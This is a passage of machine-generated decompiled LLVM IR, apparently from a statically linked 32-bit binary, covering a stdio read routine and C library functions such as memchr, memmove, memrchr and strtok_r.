  %v2_804e93f = add i32 %v4_804e938, 24
  %v3_804e93f = inttoptr i32 %v2_804e93f to i32*
  %v4_804e93f = load i32, i32* %v3_804e93f, align 4
  %v10_804e93f = icmp ult i32 %v3_804e93c, %v4_804e93f
  br i1 %v10_804e93f, label %dec_label_pc_804e9e1, label %dec_label_pc_804e948

dec_label_pc_804e948:                             ; preds = %entry
  %v2_804e948 = load i16, i16* %tmp, align 2
  %v3_804e948 = zext i16 %v2_804e948 to i32
  %v1_804e94b = and i32 %v3_804e948, 131
  %v6_804e955 = icmp ugt i32 %v1_804e94b, 128
  br i1 %v6_804e955, label %dec_label_pc_804e96f, label %dec_label_pc_804e957

dec_label_pc_804e957:                             ; preds = %dec_label_pc_804e948
  %v0_804e957 = load i32, i32* @edx, align 4
  %v6_804e95f = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_804e957, i32 %v0_804e957)
  %v1_804e967 = icmp eq i32 %v6_804e95f, 0
  %v1_804e969 = icmp eq i1 %v1_804e967, false
  br i1 %v1_804e969, label %dec_label_pc_804ea06, label %dec_label_pc_804e957.dec_label_pc_804e96f_crit_edge

dec_label_pc_804e957.dec_label_pc_804e96f_crit_edge: ; preds = %dec_label_pc_804e957
  %v0_804e96f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e96f

dec_label_pc_804e96f:                             ; preds = %dec_label_pc_804e957.dec_label_pc_804e96f_crit_edge, %dec_label_pc_804e948
  %v2_804e9a3 = phi i32 [ %v0_804e96f.pre, %dec_label_pc_804e957.dec_label_pc_804e96f_crit_edge ], [ %v4_804e938, %dec_label_pc_804e948 ]
  %v1_804e96f = inttoptr i32 %v2_804e9a3 to i32*
  %v2_804e96f = load i32, i32* %v1_804e96f, align 4
  store i32 %v2_804e96f, i32* @ecx, align 4
  %v1_804e971 = urem i32 %v2_804e96f, 65536
  store i32 %v1_804e971, i32* %edx.global-to-local, align 4
  %v2_804e974 = and i32 %v2_804e96f, 2
  %v3_804e974 = icmp eq i32 %v2_804e974, 0
  br i1 %v3_804e974, label %dec_label_pc_804e992, label %dec_label_pc_804e979

dec_label_pc_804e979:                             ; preds = %dec_label_pc_804e96f
  %v1_804e979 = urem i32 %v2_804e96f, 2
  store i32 %v1_804e979, i32* %edx.global-to-local, align 4
  %v1_804e97c = add i32 %v2_804e96f, 65535
  %v1_804e97f = trunc i32 %v1_804e97c to i16
  %v3_804e97f = inttoptr i32 %v2_804e9a3 to i16*
  store i16 %v1_804e97f, i16* %v3_804e97f, align 2
  %v0_804e982 = load i32, i32* @ebx, align 4
  %v1_804e982 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e982 = mul i32 %v1_804e982, 4
  %v3_804e982 = add i32 %v0_804e982, 36
  %v4_804e982 = add i32 %v3_804e982, %v2_804e982
  %v5_804e982 = inttoptr i32 %v4_804e982 to i8*
  %v6_804e982 = load i8, i8* %v5_804e982, align 1
  %v7_804e982 = zext i8 %v6_804e982 to i32
  %v9_804e982 = and i32 %v1_804e982, -256
  %v10_804e982 = or i32 %v7_804e982, %v9_804e982
  store i32 %v10_804e982, i32* %edx.global-to-local, align 4
  %v1_804e986 = add i32 %v0_804e982, 40
  %v2_804e986 = inttoptr i32 %v1_804e986 to i32*
  store i32 0, i32* %v2_804e986, align 4
  %v0_804e98d = load i32, i32* %edx.global-to-local, align 4
  %v1_804e98d = urem i32 %v0_804e98d, 256
  store i32 %v1_804e98d, i32* @edx, align 4
  br label %dec_label_pc_804ea09

dec_label_pc_804e992:                             ; preds = %dec_label_pc_804e96f
  %v1_804e992 = add i32 %v2_804e9a3, 16
  %v2_804e992 = inttoptr i32 %v1_804e992 to i32*
  %v3_804e992 = load i32, i32* %v2_804e992, align 4
  store i32 %v3_804e992, i32* @eax, align 4
  %v1_804e995 = add i32 %v2_804e9a3, 20
  %v2_804e995 = inttoptr i32 %v1_804e995 to i32*
  %v3_804e995 = load i32, i32* %v2_804e995, align 4
  %v15_804e995 = icmp eq i32 %v3_804e995, %v3_804e992
  %v1_804e998 = icmp eq i1 %v15_804e995, false
  br i1 %v1_804e998, label %dec_label_pc_804e9e1, label %dec_label_pc_804e99a

dec_label_pc_804e99a:                             ; preds = %dec_label_pc_804e992
  %v1_804e99a = add i32 %v2_804e9a3, 4
  %v2_804e99a = inttoptr i32 %v1_804e99a to i32*
  %v3_804e99a = load i32, i32* %v2_804e99a, align 4
  %v13_804e99a = icmp eq i32 %v3_804e99a, -2
  %v1_804e99e = icmp eq i1 %v13_804e99a, false
  br i1 %v1_804e99e, label %dec_label_pc_804e9a8, label %dec_label_pc_804e9a0

dec_label_pc_804e9a0:                             ; preds = %dec_label_pc_804e99a
  %v1_804e9a0 = or i32 %v2_804e96f, 4
  store i32 %v1_804e9a0, i32* @ecx, align 4
  %v1_804e9a3 = trunc i32 %v1_804e9a0 to i16
  %v3_804e9a3 = inttoptr i32 %v2_804e9a3 to i16*
  store i16 %v1_804e9a3, i16* %v3_804e9a3, align 2
  br label %dec_label_pc_804ea06

dec_label_pc_804e9a8:                             ; preds = %dec_label_pc_804e99a
  %v1_804e9a8 = udiv i32 %v2_804e96f, 256
  %v2_804e9a8 = trunc i32 %v1_804e9a8 to i8
  %v3_804e9a8 = urem i8 %v2_804e9a8, 4
  %v4_804e9a8 = icmp eq i8 %v3_804e9a8, 0
  %v8_804e9a8 = zext i8 %v3_804e9a8 to i32
  %v10_804e9a8 = mul nuw nsw i32 %v8_804e9a8, 256
  %v11_804e9a8 = urem i32 %v2_804e96f, 256
  %v12_804e9a8 = or i32 %v10_804e9a8, %v11_804e9a8
  store i32 %v12_804e9a8, i32* %edx.global-to-local, align 4
  br i1 %v4_804e9a8, label %dec_label_pc_804e9bd, label %dec_label_pc_804e9ad

dec_label_pc_804e9ad:                             ; preds = %dec_label_pc_804e9a8
  %v3_804e9b5 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_80540d4.318 to i16*))
  %v0_804e9bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e9bd

dec_label_pc_804e9bd:                             ; preds = %dec_label_pc_804e9a8, %dec_label_pc_804e9ad
  %v0_804e9f2 = phi i32 [ %v2_804e9a3, %dec_label_pc_804e9a8 ], [ %v0_804e9bd.pre, %dec_label_pc_804e9ad ]
  %v1_804e9bd = add i32 %v0_804e9f2, 8
  %v2_804e9bd = inttoptr i32 %v1_804e9bd to i32*
  %v3_804e9bd = load i32, i32* %v2_804e9bd, align 4
  %v1_804e9c0 = add i32 %v0_804e9f2, 12
  %v2_804e9c0 = inttoptr i32 %v1_804e9c0 to i32*
  %v3_804e9c0 = load i32, i32* %v2_804e9c0, align 4
  %v15_804e9c0 = icmp eq i32 %v3_804e9c0, %v3_804e9bd
  br i1 %v15_804e9c0, label %dec_label_pc_804e9ea, label %dec_label_pc_804e9c5

dec_label_pc_804e9c5:                             ; preds = %dec_label_pc_804e9bd
  %v2_804e9c8 = add i32 %v0_804e9f2, 24
  %v3_804e9c8 = inttoptr i32 %v2_804e9c8 to i32*
  store i32 %v3_804e9bd, i32* %v3_804e9c8, align 4
  %v0_804e9cb = load i32, i32* @ebx, align 4
  %v2_804e9cc = call i32 @__stdio_rfill(i32 %v0_804e9cb)
  %v1_804e9d4 = icmp eq i32 %v2_804e9cc, 0
  br i1 %v1_804e9d4, label %dec_label_pc_804ea06, label %dec_label_pc_804e9d8

dec_label_pc_804e9d8:                             ; preds = %dec_label_pc_804e9c5
  %v0_804e9d8 = load i32, i32* @ebx, align 4
  %v1_804e9d8 = add i32 %v0_804e9d8, 20
  %v2_804e9d8 = inttoptr i32 %v1_804e9d8 to i32*
  %v3_804e9d8 = load i32, i32* %v2_804e9d8, align 4
  %v2_804e9db = add i32 %v0_804e9d8, 24
  %v3_804e9db = inttoptr i32 %v2_804e9db to i32*
  store i32 %v3_804e9d8, i32* %v3_804e9db, align 4
  %v0_804e9de = load i32, i32* @ebx, align 4
  %v1_804e9de = add i32 %v0_804e9de, 16
  %v2_804e9de = inttoptr i32 %v1_804e9de to i32*
  %v3_804e9de = load i32, i32* %v2_804e9de, align 4
  br label %dec_label_pc_804e9e1

dec_label_pc_804e9e1:                             ; preds = %dec_label_pc_804e992, %entry, %dec_label_pc_804e9d8
  %v1_804e9e5 = phi i32 [ %v2_804e9a3, %dec_label_pc_804e992 ], [ %v4_804e938, %entry ], [ %v0_804e9de, %dec_label_pc_804e9d8 ]
  %v0_804e9e1 = phi i32 [ %v3_804e992, %dec_label_pc_804e992 ], [ %v3_804e93c, %entry ], [ %v3_804e9de, %dec_label_pc_804e9d8 ]
  %v1_804e9e1 = inttoptr i32 %v0_804e9e1 to i8*
  %v2_804e9e1 = load i8, i8* %v1_804e9e1, align 1
  %v3_804e9e1 = zext i8 %v2_804e9e1 to i32
  store i32 %v3_804e9e1, i32* @edx, align 4
  %v1_804e9e4 = add i32 %v0_804e9e1, 1
  %v2_804e9e5 = add i32 %v1_804e9e5, 16
  %v3_804e9e5 = inttoptr i32 %v2_804e9e5 to i32*
  store i32 %v1_804e9e4, i32* %v3_804e9e5, align 4
  %v0_804ea09.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ea09

dec_label_pc_804e9ea:                             ; preds = %dec_label_pc_804e9bd
  %v2_804e9ed = ptrtoint i8* %stack_var_-5 to i32
  %v5_804e9f2 = inttoptr i32 %v0_804e9f2 to i16*
  %v5_804e9f3 = call i32 @__stdio_READ(i16* %v5_804e9f2, i32 %v2_804e9ed, i32 1)
  %v1_804e9fb = icmp eq i32 %v5_804e9f3, 0
  br i1 %v1_804e9fb, label %dec_label_pc_804ea06, label %dec_label_pc_804e9ff

dec_label_pc_804e9ff:                             ; preds = %dec_label_pc_804e9ea
  %v3_804e9ff = load i8, i8* %stack_var_-5, align 1
  %v4_804e9ff = sext i8 %v3_804e9ff to i32
  store i32 %v4_804e9ff, i32* @edx, align 4
  br label %dec_label_pc_804ea09

dec_label_pc_804ea06:                             ; preds = %dec_label_pc_804e9ea, %dec_label_pc_804e9c5, %dec_label_pc_804e957, %dec_label_pc_804e9a0
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_804ea09

dec_label_pc_804ea09:                             ; preds = %dec_label_pc_804e9ff, %dec_label_pc_804e9e1, %dec_label_pc_804e979, %dec_label_pc_804ea06
  %v0_804ea09 = phi i32 [ %v4_804e9ff, %dec_label_pc_804e9ff ], [ %v0_804ea09.pre, %dec_label_pc_804e9e1 ], [ %v1_804e98d, %dec_label_pc_804e979 ], [ -1, %dec_label_pc_804ea06 ]
  store i32 %v0_804e934, i32* @ebx, align 4
  ret i32 %v0_804ea09

; uselistorder directives
  uselistorder i32 %v0_804e9e1, { 1, 0 }
  uselistorder i32 %v3_804e9bd, { 1, 0 }
  uselistorder i32 %v0_804e9f2, { 0, 1, 3, 2 }
  uselistorder i8 %v3_804e9a8, { 1, 0 }
  uselistorder i32 %v3_804e992, { 1, 0, 2 }
  uselistorder i32 %v1_804e98d, { 1, 0 }
  uselistorder i32 %v2_804e96f, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_804e9a3, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_804ea09, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ea06, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804e9e1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e9bd, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_804ea10 = load i32, i32* @edi, align 4
  store i32 %v0_804ea10, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_804ea17 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ea17, i32* %edi.global-to-local, align 4
  %v1_804ea1f = icmp eq i32 %arg3, 0
  store i1 %v1_804ea1f, i1* %zf.global-to-local, align 1
  br i1 %v1_804ea1f, label %dec_label_pc_804ea2f, label %dec_label_pc_804ea23

dec_label_pc_804ea23:                             ; preds = %entry
  %v2_804ea23 = call i32 @_strlen(i8* %arg1)
  %v3_804ea23 = mul i32 %v2_804ea23, -1
  %v4_804ea23 = add i32 %v3_804ea23, -2
  store i32 %v4_804ea23, i32* @ecx, align 4
  %v0_804ea25 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804ea25, label %dec_label_pc_804ea23.dec_label_pc_804ea2c_crit_edge, label %dec_label_pc_804ea27

dec_label_pc_804ea23.dec_label_pc_804ea2c_crit_edge: ; preds = %dec_label_pc_804ea23
  %v0_804ea2c.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_804ea2c.pre, -1
  br label %dec_label_pc_804ea2c

dec_label_pc_804ea27:                             ; preds = %dec_label_pc_804ea23
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ea2c

dec_label_pc_804ea2c:                             ; preds = %dec_label_pc_804ea23.dec_label_pc_804ea2c_crit_edge, %dec_label_pc_804ea27
  %v0_804ea2c = phi i32 [ %phitmp, %dec_label_pc_804ea23.dec_label_pc_804ea2c_crit_edge ], [ 0, %dec_label_pc_804ea27 ]
  %v8_804ea2c = icmp eq i32 %v0_804ea2c, 0
  store i1 %v8_804ea2c, i1* %zf.global-to-local, align 1
  store i32 %v0_804ea2c, i32* %edi.global-to-local, align 4
  %v2_804ea31.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804ea2f

dec_label_pc_804ea2f:                             ; preds = %entry, %dec_label_pc_804ea2c
  %v2_804ea31 = phi i32 [ %v0_804ea10, %entry ], [ %v2_804ea31.pre, %dec_label_pc_804ea2c ]
  %v0_804ea2f = phi i32 [ 0, %entry ], [ %v0_804ea2c, %dec_label_pc_804ea2c ]
  store i32 %v2_804ea31, i32* @edi, align 4
  ret i32 %v0_804ea2f

; uselistorder directives
  uselistorder i32 %v0_804ea2c, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804ea2f, { 1, 0 }
  uselistorder label %dec_label_pc_804ea2c, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804ea35 = load i32, i32* @esi, align 4
  store i32 %v0_804ea35, i32* %stack_var_-8, align 4
  %v4_804ea36 = ptrtoint i8* %arg1 to i32
  %v9_804ea42 = icmp ugt i8* %tmp4, %arg1
  %v1_804ea44 = icmp eq i1 %v9_804ea42, false
  br i1 %v1_804ea44, label %dec_label_pc_804ea4c, label %dec_label_pc_804ea46

dec_label_pc_804ea46:                             ; preds = %entry
  %v7_804ea48 = call i8* @_memcpy(i8* %arg1, i8* %tmp4, i32 %tmp)
  br label %dec_label_pc_804ea58

dec_label_pc_804ea4c:                             ; preds = %entry
  %v3_804ea4c = add i32 %arg2, -1
  %v4_804ea4c = add i32 %v3_804ea4c, %tmp
  %v5_804ea4c = inttoptr i32 %v4_804ea4c to i8*
  %v3_804ea50 = add i32 %v4_804ea36, -1
  %v4_804ea50 = add i32 %v3_804ea50, %tmp
  %v5_804ea50 = inttoptr i32 %v4_804ea50 to i8*
  %v7_804ea55 = call i8* @_memcpy(i8* %v5_804ea50, i8* %v5_804ea4c, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_804ea58

dec_label_pc_804ea58:                             ; preds = %dec_label_pc_804ea46, %dec_label_pc_804ea4c
  %v2_804ea58 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ea58, i32* @esi, align 4
  ret i32 %v4_804ea36

; uselistorder directives
  uselistorder i8* %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ea58, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804ea5c = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_804ea6f = inttoptr i32 %arg1 to i16*
  %v4_804ea6f = call i32 @memcpy(i16* %v3_804ea6f, i32 %arg2, i32 %arg3)
  %v0_804ea74 = load i32, i32* @esi, align 4
  %v2_804ea74 = add i32 %v0_804ea74, %arg3
  store i32 %v0_804ea5c, i32* @esi, align 4
  ret i32 %v2_804ea74
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_804ea85 = urem i32 %arg2, 256
  %v4_804ea91 = sext i8 %arg1 to i32
  %v2_804ea95 = add i32 %v4_804ea91, %arg3
  %v1_804eaa76 = icmp eq i32 %arg3, 0
  br i1 %v1_804eaa76, label %dec_label_pc_804eaaf, label %dec_label_pc_804eaab

dec_label_pc_804ea99:                             ; preds = %dec_label_pc_804eaab
  %v1_804ea99 = add i32 %v0_804ea99, -1
  %v5_804ea9a = load i32, i32* @edx, align 4
  %v6_804ea9a = and i32 %v5_804ea9a, -256
  %v7_804ea9a = or i32 %v6_804ea9a, %v4_804ea85
  store i32 %v7_804ea9a, i32* @edx, align 4
  %v1_804ea9e = inttoptr i32 %v1_804ea99 to i8*
  %v2_804ea9e = load i8, i8* %v1_804ea9e, align 1
  %v15_804ea9e = icmp eq i8 %v2_804ea9e, %tmp
  br i1 %v15_804ea9e, label %dec_label_pc_804eb2c, label %dec_label_pc_804eaa6

dec_label_pc_804eaa6:                             ; preds = %dec_label_pc_804ea99
  %v1_804eaa6 = add i32 %v0_804eaa6, -1
  %v8_804eaa6 = icmp eq i32 %v1_804eaa6, 0
  br i1 %v8_804eaa6, label %dec_label_pc_804eaaf, label %dec_label_pc_804eaab

dec_label_pc_804eaab:                             ; preds = %entry, %dec_label_pc_804eaa6
  %v0_804eaa6 = phi i32 [ %v1_804eaa6, %dec_label_pc_804eaa6 ], [ %arg3, %entry ]
  %v0_804ea99 = phi i32 [ %v1_804ea99, %dec_label_pc_804eaa6 ], [ %v2_804ea95, %entry ]
  %v2_804eaab = urem i32 %v0_804ea99, 4
  %v3_804eaab = icmp eq i32 %v2_804eaab, 0
  %v1_804eaad = icmp eq i1 %v3_804eaab, false
  br i1 %v1_804eaad, label %dec_label_pc_804ea99, label %dec_label_pc_804eaaf

dec_label_pc_804eaaf:                             ; preds = %dec_label_pc_804eaa6, %dec_label_pc_804eaab, %entry
  %v0_804eb12.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_804eaa6 ], [ %v0_804eaa6, %dec_label_pc_804eaab ]
  %v0_804eab4 = phi i32 [ %v2_804ea95, %entry ], [ %v1_804ea99, %dec_label_pc_804eaa6 ], [ %v0_804ea99, %dec_label_pc_804eaab ]
  store i32 %v0_804eab4, i32* @ecx, align 4
  %v2_804eab8 = mul nuw nsw i32 %v4_804ea85, 256
  %v2_804eabb = or i32 %v2_804eab8, %v4_804ea85
  %v2_804eabf = mul i32 %v2_804eabb, 65536
  %v2_804eac2 = or i32 %v2_804eabf, %v2_804eabb
  %v6_804eb1549 = icmp ugt i32 %v0_804eb12.pr, 3
  br i1 %v6_804eb1549, label %dec_label_pc_804eac6, label %dec_label_pc_804eb17

dec_label_pc_804eac6:                             ; preds = %dec_label_pc_804eaaf, %dec_label_pc_804eb0f
  %v0_804eb0f51 = phi i32 [ %v1_804eb0f, %dec_label_pc_804eb0f ], [ %v0_804eb12.pr, %dec_label_pc_804eaaf ]
  %v0_804eac650 = phi i32 [ %v1_804eac6, %dec_label_pc_804eb0f ], [ %v0_804eab4, %dec_label_pc_804eaaf ]
  %v1_804eac6 = add i32 %v0_804eac650, -4
  store i32 %v1_804eac6, i32* @ecx, align 4
  %v2_804eacb = inttoptr i32 %v1_804eac6 to i32*
  %v3_804eacb = load i32, i32* %v2_804eacb, align 4
  %v4_804eacb = xor i32 %v3_804eacb, %v2_804eac2
  %v1_804eacd = add i32 %v4_804eacb, 2130640639
  %v1_804ead3 = sub i32 -1, %v4_804eacb
  %v2_804ead5 = xor i32 %v1_804eacd, %v1_804ead3
  %v1_804ead7 = and i32 %v2_804ead5, -2130640640
  %v2_804ead7 = icmp eq i32 %v1_804ead7, 0
  br i1 %v2_804ead7, label %dec_label_pc_804eb0f, label %dec_label_pc_804eadf

dec_label_pc_804eadf:                             ; preds = %dec_label_pc_804eac6
  %v7_804eadf = or i32 %v1_804ead7, %v4_804ea85
  %v1_804eae3 = add i32 %v0_804eac650, -1
  %v2_804eae6 = inttoptr i32 %v1_804eae3 to i8*
  %v3_804eae6 = load i8, i8* %v2_804eae6, align 1
  %v16_804eae6 = icmp eq i8 %v3_804eae6, %tmp
  br i1 %v16_804eae6, label %dec_label_pc_804eb2c, label %dec_label_pc_804eaeb

dec_label_pc_804eaeb:                             ; preds = %dec_label_pc_804eadf
  %v1_804eaef = add i32 %v0_804eac650, -2
  %v2_804eaf2 = inttoptr i32 %v1_804eaef to i8*
  %v3_804eaf2 = load i8, i8* %v2_804eaf2, align 1
  %v16_804eaf2 = icmp eq i8 %v3_804eaf2, %tmp
  br i1 %v16_804eaf2, label %dec_label_pc_804eb2c, label %dec_label_pc_804eaf7

dec_label_pc_804eaf7:                             ; preds = %dec_label_pc_804eaeb
  %v1_804eafb = add i32 %v0_804eac650, -3
  %v2_804eafe = inttoptr i32 %v1_804eafb to i8*
  %v3_804eafe = load i8, i8* %v2_804eafe, align 1
  %v16_804eafe = icmp eq i8 %v3_804eafe, %tmp
  br i1 %v16_804eafe, label %dec_label_pc_804eb2c, label %dec_label_pc_804eb03

dec_label_pc_804eb03:                             ; preds = %dec_label_pc_804eaf7
  %v1_804eb07 = inttoptr i32 %v1_804eac6 to i8*
  %v2_804eb07 = load i8, i8* %v1_804eb07, align 1
  %v15_804eb07 = icmp eq i8 %v2_804eb07, %tmp
  %v1_804eb09 = icmp eq i1 %v15_804eb07, false
  br i1 %v1_804eb09, label %dec_label_pc_804eb0f, label %dec_label_pc_804eb0b

dec_label_pc_804eb0b:                             ; preds = %dec_label_pc_804eb03
  br label %dec_label_pc_804eb2c

dec_label_pc_804eb0f:                             ; preds = %dec_label_pc_804eb03, %dec_label_pc_804eac6
  %v5_804eb1c26 = phi i32 [ %v7_804eadf, %dec_label_pc_804eb03 ], [ 0, %dec_label_pc_804eac6 ]
  %v1_804eb0f = add i32 %v0_804eb0f51, -4
  %v6_804eb15 = icmp ugt i32 %v1_804eb0f, 3
  br i1 %v6_804eb15, label %dec_label_pc_804eac6, label %dec_label_pc_804eb17

dec_label_pc_804eb17:                             ; preds = %dec_label_pc_804eb0f, %dec_label_pc_804eaaf
  %v5_804eb1c25.lcssa = phi i32 [ %v4_804ea85, %dec_label_pc_804eaaf ], [ %v5_804eb1c26, %dec_label_pc_804eb0f ]
  %v0_804eac6.lcssa = phi i32 [ %v0_804eab4, %dec_label_pc_804eaaf ], [ %v1_804eac6, %dec_label_pc_804eb0f ]
  %v0_804eb0f.lcssa = phi i32 [ %v0_804eb12.pr, %dec_label_pc_804eaaf ], [ %v1_804eb0f, %dec_label_pc_804eb0f ]
  br label %dec_label_pc_804eb24

dec_label_pc_804eb1b:                             ; preds = %dec_label_pc_804eb24
  %v1_804eb24 = add i32 %v0_804eb24, -1
  %v1_804eb1b = add i32 %v0_804eb1b, -1
  %v6_804eb1c = and i32 %v5_804eb1c, -256
  %v7_804eb1c = or i32 %v6_804eb1c, %v4_804ea85
  %v1_804eb20 = inttoptr i32 %v1_804eb1b to i8*
  %v2_804eb20 = load i8, i8* %v1_804eb20, align 1
  %v15_804eb20 = icmp eq i8 %v2_804eb20, %tmp
  br i1 %v15_804eb20, label %dec_label_pc_804eb2c, label %dec_label_pc_804eb24

dec_label_pc_804eb24:                             ; preds = %dec_label_pc_804eb1b, %dec_label_pc_804eb17
  %v5_804eb1c = phi i32 [ %v7_804eb1c, %dec_label_pc_804eb1b ], [ %v5_804eb1c25.lcssa, %dec_label_pc_804eb17 ]
  %v0_804eb1b = phi i32 [ %v1_804eb1b, %dec_label_pc_804eb1b ], [ %v0_804eac6.lcssa, %dec_label_pc_804eb17 ]
  %v0_804eb24 = phi i32 [ %v1_804eb24, %dec_label_pc_804eb1b ], [ %v0_804eb0f.lcssa, %dec_label_pc_804eb17 ]
  %v10_804eb25 = icmp eq i32 %v0_804eb24, 0
  %v1_804eb28 = icmp eq i1 %v10_804eb25, false
  br i1 %v1_804eb28, label %dec_label_pc_804eb1b, label %dec_label_pc_804eb2a

dec_label_pc_804eb2a:                             ; preds = %dec_label_pc_804eb24
  br label %dec_label_pc_804eb2c

dec_label_pc_804eb2c:                             ; preds = %dec_label_pc_804ea99, %dec_label_pc_804eaf7, %dec_label_pc_804eaeb, %dec_label_pc_804eadf, %dec_label_pc_804eb1b, %dec_label_pc_804eb0b, %dec_label_pc_804eb2a
  %v0_804eb2f = phi i32 [ %v1_804eac6, %dec_label_pc_804eb0b ], [ 0, %dec_label_pc_804eb2a ], [ %v1_804eb1b, %dec_label_pc_804eb1b ], [ %v1_804eafb, %dec_label_pc_804eaf7 ], [ %v1_804eaef, %dec_label_pc_804eaeb ], [ %v1_804eae3, %dec_label_pc_804eadf ], [ %v1_804ea99, %dec_label_pc_804ea99 ]
  ret i32 %v0_804eb2f

; uselistorder directives
  uselistorder i32 %v0_804eb24, { 1, 0 }
  uselistorder i32 %v1_804eb0f, { 0, 2, 1 }
  uselistorder i32 %v1_804eac6, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_804eac650, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804eabb, { 1, 0 }
  uselistorder i32 %v0_804ea99, { 1, 0, 2 }
  uselistorder i32 %v2_804ea95, { 1, 0 }
  uselistorder i32 %v4_804ea85, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804eb2c, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804eac6, { 1, 0 }
  uselistorder label %dec_label_pc_804eaaf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804eaab, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804eb30 = load i32, i32* @edi, align 4
  %v0_804eb31 = load i32, i32* @esi, align 4
  %v0_804eb32 = load i32, i32* @ebx, align 4
  store i32 %v0_804eb32, i32* %stack_var_-12, align 4
  %v4_804eb33 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804eb33, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804eb3f = icmp eq i8* %arg1, null
  %v1_804eb41 = icmp eq i1 %v1_804eb3f, false
  br i1 %v1_804eb41, label %dec_label_pc_804eb45, label %dec_label_pc_804eb43

dec_label_pc_804eb43:                             ; preds = %entry
  %v1_804eb43 = inttoptr i32 %arg3 to i32*
  %v2_804eb43 = load i32, i32* %v1_804eb43, align 4
  store i32 %v2_804eb43, i32* @ebx, align 4
  br label %dec_label_pc_804eb45

dec_label_pc_804eb45:                             ; preds = %entry, %dec_label_pc_804eb43
  %v0_804eb48 = phi i32 [ %v4_804eb33, %entry ], [ %v2_804eb43, %dec_label_pc_804eb43 ]
  %v0_804eb45 = load i32, i32* @ecx, align 4
  %v5_804eb48 = inttoptr i32 %v0_804eb48 to i8*
  %v8_804eb49 = call i32 @__GI_strspn(i8* %v5_804eb48, i32 %arg2, i32 %v0_804eb45, i32 %v0_804eb45)
  store i32 %v8_804eb49, i32* %eax.global-to-local, align 4
  %v0_804eb51 = load i32, i32* @ebx, align 4
  %v2_804eb51 = add i32 %v0_804eb51, %v8_804eb49
  store i32 %v2_804eb51, i32* @ebx, align 4
  %v1_804eb53 = inttoptr i32 %v2_804eb51 to i8*
  %v2_804eb53 = load i8, i8* %v1_804eb53, align 1
  %v3_804eb53 = icmp eq i8 %v2_804eb53, 0
  %v1_804eb56 = icmp eq i1 %v3_804eb53, false
  br i1 %v1_804eb56, label %dec_label_pc_804eb5e, label %dec_label_pc_804eb58

dec_label_pc_804eb58:                             ; preds = %dec_label_pc_804eb45
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804eb5a = load i32, i32* @esi, align 4
  %v2_804eb5a = inttoptr i32 %v1_804eb5a to i32*
  store i32 %v2_804eb51, i32* %v2_804eb5a, align 4
  %v0_804eb88.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eb85

dec_label_pc_804eb5e:                             ; preds = %dec_label_pc_804eb45
  %v0_804eb5e = load i32, i32* @edx, align 4
  %v0_804eb60 = load i32, i32* @edi, align 4
  %v8_804eb62 = call i32 @__GI_strpbrk(i8* %v1_804eb53, i32 %v0_804eb60, i32 %v0_804eb5e, i32 %v0_804eb5e)
  store i32 %v8_804eb62, i32* %eax.global-to-local, align 4
  %v2_804eb6a = icmp eq i32 %v8_804eb62, 0
  %v1_804eb6c = icmp eq i1 %v2_804eb6a, false
  br i1 %v1_804eb6c, label %dec_label_pc_804eb7d, label %dec_label_pc_804eb6e

